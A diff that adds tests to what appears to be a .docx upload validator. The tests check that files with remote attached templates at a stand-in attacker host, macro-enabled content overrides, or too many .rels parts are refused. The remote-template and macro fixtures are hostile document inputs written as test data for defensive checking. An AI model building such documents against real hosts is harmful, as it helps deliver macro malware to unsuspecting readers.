@@ -609,6 +609,97 @@ test("a remote template, OLE link, frame, subdocument or package is refused; an 
   ).toMatch(/\.docx$/);
 });
 
+test("element names are matched without their namespace prefix, in .rels and in the types part", async () => {
+  const store = createMaterialStore(dir);
+  const prefixedRels = (body: string) =>
+    strToU8(
+      `<?xml version="1.0"?><r:Relationships xmlns:r="http://schemas.openxmlformats.org/package/2006/relationships">${body}</r:Relationships>`,
+    );
+  const STRICT = "http://purl.oclc.org/ooxml/officeDocument/relationships";
+  const refused: [string, Uint8Array][] = [
+    [
+      "prefixed relationship",
+      docxWith(MAIN, {
+        "word/_rels/settings.xml.rels": prefixedRels(
+          `<r:Relationship Id="r1" Type="${REL}/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/>`,
+        ),
+      }),
+    ],
+    [
+      "strict namespace relationship",
+      docxWith(MAIN, {
+        "word/_rels/settings.xml.rels": rels(
+          `<Relationship Id="r1" Type="${STRICT}/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/>`,
+        ),
+      }),
+    ],
+    [
+      "prefixed macro override",
+      zipSync({
+        "[Content_Types].xml": strToU8(
+          `<?xml version="1.0"?><ct:Types xmlns:ct="http://schemas.openxmlformats.org/package/2006/content-types"><ct:Override PartName="/word/document.xml" ContentType="${CT.docx}"/><ct:Override PartName="/m.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></ct:Types>`,
+        ),
+      }),
+    ],
+  ];
+  for (const [what, bytes] of refused) {
+    const err = await refusal(
+      store.save({ name: "a.docx", stream: from(bytes) }),
+    );
+    expect(err.code, what).toBe("material-content");
+  }
+  // a writer that prefixes the types part is still read: the main type is found
+  const prefixedTypes = zipSync({
+    "[Content_Types].xml": strToU8(
+      `<?xml version="1.0"?><ct:Types xmlns:ct="http://schemas.openxmlformats.org/package/2006/content-types"><ct:Override PartName="/word/document.xml" ContentType="${CT.docx}"/></ct:Types>`,
+    ),
+  });
+  expect(
+    (await store.save({ name: "p.docx", stream: from(prefixedTypes) }))
+      .storedName,
+  ).toMatch(/\.docx$/);
+  expect(files()).toHaveLength(1);
+});
+
+test("a directory entry under embeddings/ is ignored, not refused", async () => {
+  const store = createMaterialStore(dir);
+  const bytes = docxWith(MAIN, {
+    "word/embeddings/": new Uint8Array(),
+    "word/embeddings/Sheet1.xlsx": new Uint8Array([1]),
+  });
+  expect(
+    (await store.save({ name: "d.docx", stream: from(bytes) })).storedName,
+  ).toMatch(/\.docx$/);
+});
+
+test("the .rels parts are limited to 500 in number and 5 MB declared in all", async () => {
+  const store = createMaterialStore(dir);
+  const link = `<Relationship Id="r" Type="${REL}/hyperlink" Target="https://example.org" TargetMode="External"/>`;
+  const many: Record<string, Uint8Array> = {};
+  for (let i = 0; i < 501; i++)
+    many[`word/_rels/part${i}.xml.rels`] = rels(link);
+  const err = await refusal(
+    store.save({ name: "many.docx", stream: from(docxWith(MAIN, many)) }),
+  );
+  expect(err.code).toBe("material-content");
+  // 500 is allowed
+  const ok: Record<string, Uint8Array> = {};
+  for (let i = 0; i < 500; i++) ok[`word/_rels/part${i}.xml.rels`] = rels(link);
+  expect(
+    (await store.save({ name: "ok.docx", stream: from(docxWith(MAIN, ok)) }))
+      .storedName,
+  ).toMatch(/\.docx$/);
+  // seven parts of about 0.9 MB each are over 5 MB together, though each is under the 1 MB limit
+  const filler = " ".repeat(900 * 1024);
+  const big: Record<string, Uint8Array> = {};
+  for (let i = 0; i < 7; i++)
+    big[`word/_rels/big${i}.xml.rels`] = rels(link + filler);
+  const bigErr = await refusal(
+    store.save({ name: "big.docx", stream: from(docxWith(MAIN, big)) }),
+  );
+  expect(bigErr.code).toBe("material-content");
+});
+
 /** Adds one more local-file entry (stored, not compressed) to a zip, even when the name is already there. */
 function appendEntry(
   zip: Uint8Array,
